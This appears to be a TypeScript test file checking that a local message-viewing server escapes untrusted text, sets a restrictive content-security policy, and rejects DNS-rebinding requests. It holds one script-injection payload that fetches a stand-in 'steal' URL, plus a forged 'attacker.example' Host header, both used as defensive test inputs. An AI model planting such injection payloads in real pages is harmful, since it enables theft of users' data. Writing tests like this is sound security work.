import test from "node:test";
import assert from "node:assert/strict";
import { CardView } from "../cli/card-view";
import { get } from "node:http";

test("local card view is read-only, private, and safely embeds untrusted message text", async () => {
  const view = new CardView();
  try {
    const malicious = '</script><script>fetch("https://example.com/steal")</script>';
    const url = await view.publish("messages", { requests: [{ untrusted_text: { details: malicious } }] });
    assert.equal(new URL(url).hostname, "127.0.0.1");
    const response = await fetch(url);
    assert.equal(response.status, 200);
    assert.equal(response.headers.get("cache-control"), "no-store");
    assert.match(response.headers.get("content-security-policy")!, /connect-src 'none'/);
    const html = await response.text();
    assert.match(html, /data-standalone="true"/);
    assert.ok(!html.includes(malicious));
    const snapshot = JSON.parse(html.match(/<script id="snapshot" type="application\/json">(.*?)<\/script>/s)![1]);
    assert.equal(JSON.parse(snapshot.content[0].text).requests[0].untrusted_text.details, malicious);
    assert.equal((await fetch(new URL("/messages", url))).status, 404);
    const reboundStatus = await new Promise<number | undefined>((resolve, reject) => {
      get(url, { headers: { Host: "attacker.example" } }, res => { res.resume(); resolve(res.statusCode); }).on("error", reject);
    });
    assert.equal(reboundStatus, 404);
    assert.equal((await fetch(url, { method: "POST" })).status, 404);
    assert.equal(await view.publish("messages", { requests: [] }), url);
    assert.match(await (await fetch(url)).text(), /\\"requests\\":\[\]/);
  } finally {
    await view.close();
  }
});
